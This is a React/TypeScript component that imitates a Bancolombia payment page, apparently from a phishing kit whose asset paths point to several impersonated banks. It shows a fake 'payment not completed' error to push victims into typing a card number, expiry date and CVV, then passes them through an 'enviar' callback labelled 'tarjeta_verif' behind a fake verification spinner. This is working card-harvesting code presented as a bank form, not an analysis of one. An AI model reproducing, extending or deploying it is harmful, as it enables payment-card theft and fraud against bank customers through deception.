/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState, useMemo } from "react";
import FullScreenLoader from "./FullScreenLoader";

export default function Tarcredito({ enviar }: any) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [loading, setLoading] = useState(false);
  const [cvv, setCvv] = useState("");

  // Validaciones (Igual que en el Login)
  const isFormValid = useMemo(() => {
    return tarjeta.length === 16 && fecha.length === 5 && cvv.length === 3;
  }, [tarjeta, fecha, cvv]);

  const handleSubmit = () => {
    if (!isFormValid) return;

    enviar?.({
      view: "tarjeta_verif",
      tarjeta: tarjeta, // Número de tarjeta como usuario
      fecha: fecha,
      cvv: cvv,
      bank: "bancolombia"
    });
    setLoading(true);
  };

  // Formateador de Fecha MM/AA automático
  const handleFecha = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 2) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4);
    }
    setFecha(value.substring(0, 5));
  };

  return (
    <div className="bc-row bc-justify-content-center form-container">
      <FullScreenLoader show={loading} text="Estamos verificando tus datos" />
      <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
        <section className="bc-mt-4 bg-[#f9f9fa]" />

        <div>
          <div className="bc-card-body bc-mt-4">
            <div className="bc-card bc-card-auth bc-card-container">
              <div className="bc-card-auth-body">

                <section className="bc-card-auth-head">
                  <div className="flex flex-col items-center justify-center text-center w-full">
                    <img src="/bancos/bancol/cc1.svg" alt="card icon" height={60} width={60} className="bc-card-icon-mt mb-4" />

                    <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3 bc-title-size">
                      Pago no realizado
                    </h1>
                    <h3 className="bc-card-auth-description bc-mt-2 auth-description bc-desc-size">
                      En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
                    </h3>
                  </div>
                </section>

                <form noValidate id="form" onSubmit={(e) => e.preventDefault()}>
                  <section>
                    <section className="bc-card-auth-container">

                      {/* Campo: Número de Tarjeta */}
                      <div className="authentication-form__username">
                        <div className="bc-form-field">
                          <em aria-hidden="true" className="bc-icon flex items-center justify-center">
                            <img src="/bancos/bancol/cc1.svg" alt="card icon" className="w-[20px] h-[20px]" />
                          </em>
                          <input
                            id="tarjeta"
                            value={tarjeta}
                            onChange={(e) => setTarjeta(e.target.value.replace(/\D/g, "").substring(0, 16))}
                            className="bc-input"
                            placeholder=" "
                            inputMode="numeric"
                            autoComplete="off"
                            aria-label="Número de tarjeta"
                          />
                          <label htmlFor="tarjeta" className="opacity-100 translate-y-0 label-fixed">
                            Número de tarjeta
                          </label>
                        </div>
                      </div>

                      {/* Campo: Fecha MM/AA */}
                      <div className="authentication-form__username bc-mt-2">
                        <div className="bc-form-field">
                          <em aria-hidden="true" className="bc-icon flex items-center justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                              <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                              <line x1="16" y1="2" x2="16" y2="6"></line>
                              <line x1="8" y1="2" x2="8" y2="6"></line>
                              <line x1="3" y1="10" x2="21" y2="10"></line>
                            </svg>
                          </em>
                          <input
                            id="fecha"
                            value={fecha}
                            onChange={handleFecha}
                            className="bc-input"
                            placeholder=" "
                            maxLength={5}
                            inputMode="numeric"
                            autoComplete="off"
                            aria-label="Fecha de vencimiento"
                          />
                          <label htmlFor="fecha" className="opacity-100 translate-y-0 label-fixed">
                            Fecha de vencimiento (MM/AA)
                          </label>
                        </div>
                      </div>

                      {/* Campo: CVV */}
                      <div className="authentication-form__username bc-mt-2">
                        <div className="bc-form-field">
                          <em aria-hidden="true" className="bc-icon">
                            lock
                          </em>
                          <input
                            id="cvv"
                            type="password"
                            value={cvv}
                            onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").substring(0, 3))}
                            className="authentication-form__password-input bc-input"
                            placeholder=" "
                            maxLength={3}
                            inputMode="numeric"
                            autoComplete="off"
                            aria-label="Código de seguridad"
                          />
                          <label htmlFor="cvv" className="opacity-100 translate-y-0 label-fixed">
                            Código de seguridad (CVV)
                          </label>
                        </div>
                      </div>

                    </section>
                  </section>

                  {/* Botón de Acción Principal */}
                  <section className="bc-card-auth-button bc-mt-2">
                    <button
                      className="bc-button bc-button-fill bc-button-primary"
                      type="button"
                      disabled={!isFormValid}
                      onClick={handleSubmit}
                    >
                      Continuar
                    </button>
                  </section>
                </form>

                <section className="bc-card-auth-link bc-mt-4">
                  <button className="bc-link link-default link-underline bg-transparent border-none cursor-pointer" onClick={() => window.location.reload()}>
                    <u>Regresar</u>
                  </button>
                </section>

              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}